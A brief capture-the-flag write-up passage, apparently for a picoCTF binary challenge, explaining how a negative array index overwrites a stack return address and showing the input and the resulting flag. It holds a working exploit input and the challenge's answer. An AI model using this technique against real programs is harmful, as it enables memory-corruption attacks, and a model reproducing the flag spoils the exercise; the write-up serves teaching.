Since the array is on stack (stack address is random), we can't overwrite anything in `.got.plt`.
But we can overwrite return address (it will be always 20 bytes before the array in memory, at index `-5`).

```
$ ./vuln
Input the integer value you want to put in the array

134514118
Input the index in which you want to put the value

-5
picoCTF{str1nG_CH3353_59c3cf5a}
```
